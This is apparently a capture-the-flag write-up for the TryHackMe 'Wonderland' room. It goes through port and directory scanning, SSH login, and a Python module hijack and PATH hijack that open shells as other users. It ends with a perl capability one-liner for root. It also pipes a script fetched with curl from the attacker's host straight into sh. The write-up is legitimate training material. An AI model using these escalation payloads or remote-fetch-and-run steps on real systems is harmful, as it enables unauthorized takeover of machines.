# [Wonderland](https://tryhackme.com/room/wonderland)

<h3>Nmap scan</h3>

`nmap -Pn -sV -v 10.10.254.5`

```

Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-25 11:25 EDT
NSE: Loaded 45 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 11:25
Completed Parallel DNS resolution of 1 host. at 11:25, 0.00s elapsed
Initiating Connect Scan at 11:25
Scanning 10.10.254.5 [1000 ports]
Discovered open port 80/tcp on 10.10.254.5
Discovered open port 22/tcp on 10.10.254.5
Increasing send delay for 10.10.254.5 from 0 to 5 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.254.5 from 5 to 10 due to max_successful_tryno increase to 6
Completed Connect Scan at 11:25, 29.25s elapsed (1000 total ports)
Initiating Service scan at 11:25
Scanning 2 services on 10.10.254.5
Completed Service scan at 11:25, 13.79s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.254.5.
Initiating NSE at 11:25
Completed NSE at 11:25, 0.84s elapsed
Initiating NSE at 11:25
Completed NSE at 11:26, 0.86s elapsed
Nmap scan report for 10.10.254.5
Host is up (0.20s latency)
Not shown: 998 closed ports

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.02 seconds
```

Let use Gobuster for directory scanning

`gobuster dir -u http://10.10.254.5/ -w /usr/share/wordlists/dirb/common.txt`

```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.254.5
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/25 11:28:53 Starting gobuster in directory enumeration mode
===============================================================

/img                  (Status: 301) [Size: 0] [--> img/]

/index.html           (Status: 301) [Size: 0] [--> ./]  

/r                    (Status: 301) [Size: 0] [--> r/]  
===============================================================
2021/06/25 11:31:40 Finished
===============================================================
```
we found a `/r` directory, let use gobuster again to scan this directory

`gobuster dir -u http://10.10.254.5/r/ -w /usr/share/wordlists/dirb/common.txt`

```

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.254.5/r/a
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/25 11:35:48 Starting gobuster in directory enumeration mode
===============================================================

/b                    (Status: 301) [Size: 0] [--> b/]

/index.html           (Status: 301) [Size: 0] [--> ./]
===============================================================
2021/06/25 11:37:40 Finished
===============================================================
```

we found another directory `/b`, after scanning it again you will find another directory `/b` which itself contains `/i`, on scanning `/i` another directory `/t` will show up and it will be the last directory `http://10.10.254.5/r/a/b/b/i/t/`

Let's **view the page source code of `http://10.10.254.5/r/a/b/b/i/t/`**.

We get `alice:H***************************************l`

Let's use above credentials to gain access via **ssh** as **alice**.
`ssh alice@10.10.254.5`

```
kali@localhost:~$ ssh alice@10.10.254.5
The authenticity of host '10.10.254.5 (10.10.254.5)' can't be established.
ECDSA key fingerprint is SHA256:HUoT05UWCcf3WRhR5kF7yKX1yqUvNhjqtxuUMyOeqR8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.254.5' (ECDSA) to the list of known hosts.
alice@10.10.254.5's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jun 26 08:06:30 UTC 2021

  System load:  0.08               Processes:           85
  Usage of /:   18.9% of 19.56GB   Users logged in:     0
  Memory usage: 13%                IP address for eth0: 10.10.254.5
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon May 25 16:37:21 2020 from 192.168.170.1
alice@wonderland:~$ 
```

Let's check the home directory to get further more information about user or other users
`cd /home/`
We get 4 users, `alice` , `rabbit`, `hatter` , `tryhackme`.However we are not allowed to `cd` to another user directory.
Let's get back to `alice` home directory

`ls -al`
```

alice@wonderland:~$ ls -al
total 40
drwxr-xr-x 5 alice alice 4096 May 25  2020 .
drwxr-xr-x 6 root  root  4096 May 25  2020 ..
lrwxrwxrwx 1 root  root     9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 alice alice  220 May 25  2020 .bash_logout
-rw-r--r-- 1 alice alice 3771 May 25  2020 .bashrc
drwx------ 2 alice alice 4096 May 25  2020 .cache
drwx------ 3 alice alice 4096 May 25  2020 .gnupg
drwxrwxr-x 3 alice alice 4096 May 25  2020 .local
-rw-r--r-- 1 alice alice  807 May 25  2020 .profile
-rw------- 1 root  root    66 May 25  2020 root.txt
-rw-r--r-- 1 root  root  3577 May 25  2020 walrus_and_the_carpenter.py
```

Two files `root.txt` (only root access) and `walrus_and_the_carpenter.py` ( can read ) .
Let's read `walrus_and_the_carpenter.py` file
```

import random
poem = """The sun was shining on the sea,
Shining with all his might:
He did his very best to make

*************************** not of much importance ***************************

And that was scarcely odd, because
They’d eaten every one."""

for i in range(10):
    line = random.choice(poem.split("\n"))
    print("The line was:\t", line)
```
We don't have enough privilege to execute `walrus_and_the_carpenter.py`. Let's check what sudo permission does `alice` have
`sudo -l`

```

alice@wonderland:~$ sudo -l
[sudo] password for alice: 
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

As `rabbit` we can execute `walrus_and_the_carpenter.py`

Let's do this

We can use path manipulation techniques. On first line of `walrus_and_the_carpenter.py`, it imports a module `random`.
If we create a `random.py` file in the same directory, the first line will run that file
We can use the `random.py` file to give us a shell as `rabbit`

`random.py`
```

import os
os.system("/bin/bash")
```

Let's execute the `walrus_and_the_carpenter.py` file

`sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`
this will give us a shell as `rabbit`

Now move to `rabbit` home directory 

`cd ../rabbit/`

```

rabbit@wonderland:/home/rabbit$ ls
teaParty
```

Let's check what kind of file `teaParty` is

```
rabbit@wonderland:/home/rabbit$ file teaParty 
teaParty: setuid, setgid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=75a832557e341d3f65157c22fafd6d6ed7413474, not stripped
```
it's a executable file **(ELF)**

```

rabbit@wonderland:/home/rabbit$ cat teaParty 
ELF>�@0:@8
          @@@@h���HH==   88�-�=�=hp�-�=�=����DDP�td� � � <<Q�tdR�td�-�=�=▒▒/lib64/ld-linux-x86-64.so.2GNUGNUu�2U~4?e|"��mn�A4t
�
�e�mZ <v 5� 
            &"libc.so.6setuidputsgetcharsystem__cxa_finalizesetgid__libc_start_mainGLIBC_2.2.5_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableu▒i        N�p�0HH@�?�?�?��?
#H�=��&/�DH�=�/H��/H9�tH��.H��t������H�=Y/H�5R/H)�H��H��H��?H�H��tH��.H����fD���=/u/UH�=�.H��tf�1�I��^H��H���PTL��H�
                                                                                              H�=�.�-����h�����.]�����{���UH����������������H�=t�����H�=������H�=����������H�=�n����]�f.��AWI��AVI��AUA��ATL�%,UH�-,SL)�H�����H��t�L��L��D��A��H��H9�u�H�[]A\A]A^A_��H�H��Welcome to the tea party!
The Mad Hatter will be here soon./bin/echo -n 'Probably by ' && date --date='next hour' -RAsk very nicely, and I will give you some tea while you wait for himSegmentation fault (core dumped)8,�������������T����������<���,zRx ....

```

`/bin/echo -n 'Probably by ' && date `

We can use file path manipulation again, this time for `date`
Create a file with name `date`

Steps include

```

rabbit@wonderland:/home/rabbit$ cat date
#!/bin/bash
/bin/bash
```
`rabbit@wonderland:/home/rabbit$ chmod +x date`

`rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH`
```

rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ whoami
hatter
hatter@wonderland:/home/rabbit$ 
```

Now we are `hatter`

Move to `hatter` home directory. `cd /home/hatter/ `

```

hatter@wonderland:/home/hatter$ ls -al
total 28
drwxr-x--- 3 hatter hatter 4096 May 25  2020 .
drwxr-xr-x 6 root   root   4096 May 25  2020 ..
lrwxrwxrwx 1 root   root      9 May 25  2020 .bash_history -> /dev/null
-rw-r--r-- 1 hatter hatter  220 May 25  2020 .bash_logout
-rw-r--r-- 1 hatter hatter 3771 May 25  2020 .bashrc
drwxrwxr-x 3 hatter hatter 4096 May 25  2020 .local
-rw-r--r-- 1 hatter hatter  807 May 25  2020 .profile
-rw------- 1 hatter hatter   29 May 25  2020 password.txt
```

Important file `password.txt`

```

hatter@wonderland:/home/hatter$ cat password.txt 
W**************************?
```

Let's check for `sudo permission` that `hatter` have

```
hatter@wonderland:/home/hatter$ sudo -l
[sudo] password for hatter: 
Sorry, user hatter may not run sudo on wonderland.
```

` hatter doesn't have any sudo permission `

Let's use external script to check privilege escalation

**I have downloaded the file [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) file on my local system and started a python server and accessed LineEnum.sh in ssh via curl**


`hatter@wonderland:/home/hatter$ curl http://10.9.4.169:8000/LinEnum.sh | sh `

Important section POSIX
```

[+] Files with POSIX capabilities set:
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

Let's search [GTFOBins for perl capabilities](https://gtfobins.github.io/gtfobins/perl/)

`./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`

we can use this to get root access

## Important
When I first tried it, it said permission denied. I kept trying and it kept denying, then I checked for `id` command and it showed `guid` for rabbit

If you get that too, use
`ssh hatter@10.10.254.5` using password from `password.txt`

Run perl privilege escalation script again,

This time it will run successfully

## user.txt
cat /root/user.txt

## root.txt
cat /home/alice/root.txt

